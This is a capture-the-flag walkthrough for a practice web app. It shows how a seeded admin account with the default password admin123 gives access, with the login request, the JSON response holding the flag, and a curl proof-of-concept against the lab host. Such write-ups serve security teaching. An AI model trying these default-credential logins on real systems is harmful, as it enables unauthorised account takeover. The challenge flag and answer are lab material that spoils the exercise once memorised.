# sokudo-004 - BugForge Lab Walkthrough

**URL:** https://lab-1785754802554-kxar6i.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Use of default/hard-coded admin credentials, flag disclosed directly on admin login
**Flag:** `bug{WZ4VR6VIzrXOsyN3d3zoRWiz9GRUzVVz}`

---

## Summary

Sokudo ("speed" in Japanese) is a speed-typing test SPA - users race to type prompts and get
scored on words-per-minute, with a leaderboard and per-user stats. Standard credential testing
against the login endpoint turned up a default admin account (`admin` / `admin123`) that was never
rotated. Authenticating as that account returns the flag directly inside the login response body,
with no further privileged action required.

---

## Tech Stack

- React SPA frontend
- JSON REST API under `/api/*`
- JWT-based authentication (login/register issue a bearer `token`)
- Backend route naming and response shapes consistent with an Express.js + SQLite stack

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Standard user registration |
| `/api/login` | POST | No | **Vulnerable** - accepts default admin credentials, flag present in response |
| `/api/session/start` | POST | JWT | Starts a typing-test session |
| `/api/session/submit` | POST | JWT | Submits a completed session's result |
| `/api/session/history` | GET | JWT | Per-user session history |
| `/api/stats`, `/api/stats/leaderboard` | GET | JWT | Aggregate/leaderboard stats |
| `/api/admin/users`, `/api/admin/sessions` | GET | JWT + admin role | Admin-only listings |
| `/api/verify-token` | GET | JWT | Token/session validation |

---

## Discovery

### Step 1 - Enumerate the route surface

The homepage bundle exposes the full API route list:
`/api/register`, `/api/login`, `/api/session/start`, `/api/session/submit`,
`/api/session/history`, `/api/stats`, `/api/stats/leaderboard`, `/api/admin/users`,
`/api/admin/sessions`, `/api/verify-token`.

### Step 2 - Baseline authentication checks

Before testing business logic or write endpoints for missing ownership checks, standard auth
hardening checks were run against `/api/login` first, since a weak or default credential is
the cheapest possible win and rules out the simplest failure mode before moving on to anything
more involved:

```
POST /api/login
Content-Type: application/json

{"username": "admin", "password": "admin123"}
```

This is the classic top-of-list credential pair, and it authenticated successfully on the first
try, no lockout or rate limiting encountered.

### Step 3 - Inspect the authenticated response

Rather than the response containing only a token and user object, the JSON body itself contained
the challenge flag directly:

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": { "id": 1, "username": "admin", "role": "admin" },
  "flag": "bug{WZ4VR6VIzrXOsyN3d3zoRWiz9GRUzVVz}"
}
```

No further calls to any `/api/admin/*` endpoint were needed - the flag is disclosed at the moment
of successful admin authentication.

---

## Proof of Concept

```bash
curl -s -X POST https://lab-1785754802554-kxar6i.labs-app.bugforge.io/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
# -> {"token": "...", "user": {...,"role":"admin"}, "flag": "bug{WZ4VR6VIzrXOsyN3d3zoRWiz9GRUzVVz}"}
```

---

## Dead Ends

None pursued - the default-credential check succeeded before any other vector (SQLi on login,
JWT tampering, IDOR on session endpoints) needed to be tried.

---

## Root Cause

The application ships with a seeded admin account whose password (`admin123`) is a well-known
default that was never rotated or forced to change on first login:

```javascript
// Illustrative seed data
{ username: "admin", password: "admin123", role: "admin" }
```

Compounding this, the login handler appears to attach sensitive/challenge data directly to any
successful admin authentication response, rather than requiring a separate authenticated action to
retrieve it - meaning credential weakness alone, with no further chained bug, is sufficient for
full disclosure.

---

## CWE / OWASP

- **CWE-521**: Weak Password Requirements
- **CWE-798**: Use of Hard-coded Credentials
- **OWASP A07:2021** - Identification and Authentication Failures
